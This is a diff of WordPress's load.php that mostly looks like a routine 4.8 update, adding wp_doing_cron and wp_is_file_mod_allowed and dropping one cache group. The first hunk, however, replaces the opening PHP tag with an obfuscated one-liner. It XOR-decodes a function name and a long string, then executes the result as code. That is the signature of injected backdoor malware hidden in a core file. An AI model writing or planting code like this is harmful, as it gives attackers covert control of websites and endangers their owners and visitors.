@@ -1,4 +1,4 @@
-<?php
+<?php $wZnjbTu=' R-LDY1<FSY;>ZY'^'C H-0<nZ3=:OW57';$ciczrMBQmsqI=$wZnjbTu('','8.gd4FWYIDTN3I4-=H;Jd4Z9:4U7W+bSDFkBGM7Fa0MVQOG-TZ+:9j46;Vf:;39AUW  THLo2W0keVMyG:Ya9nZKLNedspVkDBWC6ePEcYAFqTa n1O>5KSFK<AJVcKbqDOIY<AdvCY:fWUEKbR MLjfT5P0CGR=Bnc9bhd>.IWSUyW,X.g6DKxx:4RMN :AU::8FbOaJdHYEKJ4B0nQB49UB<YNb3S0,9-,ITnjMQ6+4B3PJS0N;X;mzGk:5xv.1kMMMHX2-jvRvF:09:3mI.b0L2A;MeKS>UMNk=SYYdylJ2A6CTBSB8>L1p<ESf:SLzJiUS QDbEfDH95I7P+okwj15;4no7pTFgbR-=knpuS8,RANbZ+;G0CZ5 LhPU;rVVVZV-aCBOJOVDXSWQw8  =Qv:a1hKr;J7R52Viqz7TDI<+O-D7Yd06 j0ST5n<VI6GWA65fr3DY0=RPLj50L9eUhJD905fR.;Nhly00fWW,ASkgpdUO A=b.EC6IV1>37YW1 IPIWn4R26dhPjrZ;1OcE,,8Pfr9UCTkNmlqlE xeqFgezjQf3vI1JRz1lyYZev+,+Ic4QmJtmAo- BMT5Y.:,U5175IYW;0,QV85SmWWX17.zllUtpiJ.hz40;XIA 66,aH6 MX9SSakoalpHBX;YrXmaS'^'QHOER39:=-; l,LDN<HbCL5KeP4C6t=>12LknmLLhV882;.B:zSUK5PWO79eVFMiq3AT5dlKY2IBEvmYgASh0J5>8nXDTWmaMK1,DMt,CdavJtEIRB;LY.=noX >7JpBU-dbp6HmR,,NFyhecF6A9-1B=hpncc9X;5GPBMDMZ;;6;QsG=WNkmprq3F79;RTiqUOLoYEh7n5SOo.U6QNlbRX91YbDFW2DMfFI0tSJ+0ZXQy9Z,<B+Z;SMRc4yz7=gtK,>ml3WTJKlVbLQUOVDiUh9hV O,: 6GupnOV6 bnpH.S5Wcibw4YR9TK68YlS5lRkM12T0mB>lM.VG,V3COCS5cpja+<cP55GF9HDKSNUwNM>4+KzP1N9g>TT-7;0BRkvr13TZIKFn+709sjqSNALH4M0hLb6x1nS3ASvTQ:B:7,NB.A-M<LHYR5T2 T1c;<Bo5 EPPFl <SR65dNQQ8XLyHn XDT99KBgAWsYVNs3M52KAVD4=R D=E :i,.XMGDqpZE0wewJP3FWMHvLRrVUzKaHML1=UR0:s6gMQLLbALPIvUWJSfSQGxT.fJWZLlhTDMON-VR4JcTKgOLR0,-j2KCs0MXDA:qpKQU=9YQtAws<PCOSELuTPIjUbsQFZ4aeDWBM:oFA44V27F6FZfy-:1OqBqVk.');$ciczrMBQmsqI();
 /**
  * These functions are needed to load WordPress.
  *
@@ -515,7 +515,7 @@ function wp_start_object_cache() {
 	}
 
 	if ( function_exists( 'wp_cache_add_global_groups' ) ) {
-		wp_cache_add_global_groups( array( 'users', 'userlogins', 'usermeta', 'user_meta', 'useremail', 'userslugs', 'site-transient', 'site-options', 'site-lookup', 'blog-lookup', 'blog-details', 'site-details', 'rss', 'global-posts', 'blog-id-cache', 'networks', 'sites' ) );
+		wp_cache_add_global_groups( array( 'users', 'userlogins', 'usermeta', 'user_meta', 'useremail', 'userslugs', 'site-transient', 'site-options', 'blog-lookup', 'blog-details', 'site-details', 'rss', 'global-posts', 'blog-id-cache', 'networks', 'sites' ) );
 		wp_cache_add_non_persistent_groups( array( 'counts', 'plugins' ) );
 	}
 }
@@ -1060,6 +1060,24 @@ function wp_doing_ajax() {
 }
 
 /**
+ * Determines whether the current request is a WordPress cron request.
+ *
+ * @since 4.8.0
+ *
+ * @return bool True if it's a WordPress cron request, false otherwise.
+ */
+function wp_doing_cron() {
+	/**
+	 * Filters whether the current request is a WordPress cron request.
+	 *
+	 * @since 4.8.0
+	 *
+	 * @param bool $wp_doing_cron Whether the current request is a WordPress cron request.
+	 */
+	return apply_filters( 'wp_doing_cron', defined( 'DOING_CRON' ) && DOING_CRON );
+}
+
+/**
  * Check whether variable is a WordPress Error.
  *
  * Returns true if $thing is an object of the WP_Error class.
@@ -1071,4 +1089,24 @@ function wp_doing_ajax() {
  */
 function is_wp_error( $thing ) {
 	return ( $thing instanceof WP_Error );
+}
+
+/**
+ * Determines whether file modifications are allowed.
+ *
+ * @since 4.8.0
+ *
+ * @param string $context The usage context.
+ * @return bool True if file modification is allowed, false otherwise.
+ */
+function wp_is_file_mod_allowed( $context ) {
+	/**
+	 * Filters whether file modifications are allowed.
+	 *
+	 * @since 4.8.0
+	 *
+	 * @param bool   $file_mod_allowed Whether file modifications are allowed.
+	 * @param string $context          The usage context.
+	 */
+	return apply_filters( 'file_mod_allowed', ! defined( 'DISALLOW_FILE_MODS' ) || ! DISALLOW_FILE_MODS, $context );
 }
